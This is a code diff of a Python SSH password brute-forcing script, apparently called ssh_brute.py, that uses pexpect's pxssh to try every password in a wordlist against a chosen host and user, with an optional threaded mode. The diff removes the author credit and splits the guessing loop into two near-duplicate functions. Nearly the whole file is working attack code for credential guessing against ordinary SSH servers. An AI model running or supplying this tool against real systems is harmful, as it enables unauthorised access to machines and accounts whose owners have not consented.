@@ -1,21 +1,8 @@
-#Made by FoxSinOfGreed1729
-#Many thanks to TJ O'Connor
-
 from pexpect import pxssh
 import optparse
 import threading
 
-def connect(user,host,password):
-    
-    try:
-        s=pxssh.pxssh()
-        s.login(host,user,password)
-        print("Password is -->", password)
-        return s
-    except:
-        pass
-def connectThread(user, host, passwd):
-    
+def connect(user,host,passwd):
     passwdfile=open(passwd,'r')
     for line in passwdfile.readlines():
         password=line.strip('\n')
@@ -24,11 +11,26 @@ def connectThread(user, host, passwd):
             s=pxssh.pxssh()
             s.login(host,user,password)
             print("Password is -->", password)
-            return s
+            return(False)
+        except:
+            pass
+
+def connectThread(user, host, passwd):
+
+    passwdfile=open(passwd,'r')
+    for line in passwdfile.readlines():
+        password=line.strip('\n')
+        print("Trying password --> ",password)
+        try:
+            s=pxssh.pxssh()
+            s.login(host,user,password)
+            print("Password is -->", password)
+            return(False)
         except:
             pass
 
 def main():
+
     usage = "usage: python3 ssh_brute.py [options] argument use -h for help"
     parser=optparse.OptionParser(usage=usage)
     parser.add_option('-u', dest='user', type='string', help='Specify User name')
@@ -44,16 +46,14 @@ def main():
         print(parser.usage)
         exit(0)
     print("Remember, a bruteforce tool is only as good as the dictionary bring provided. Make a good dictionary")
-    passwdfile=open(options.passwd,'r')
+
     if th1:
         print("Doing a threaded bruteforce....")
         t=threading.Thread(target=connectThread,args=(user, host, passwd))
         t.start()
+        #s=t.join()
     else:
         print("Not using threads....")
-        for line in passwdfile.readlines():
-            password=line.strip('\n')
-            print("Trying password --> ",password)
-            s=connect(user, host, password)
-    exit(0)
+        connect(user, host, passwd)
+    exit()
 main()
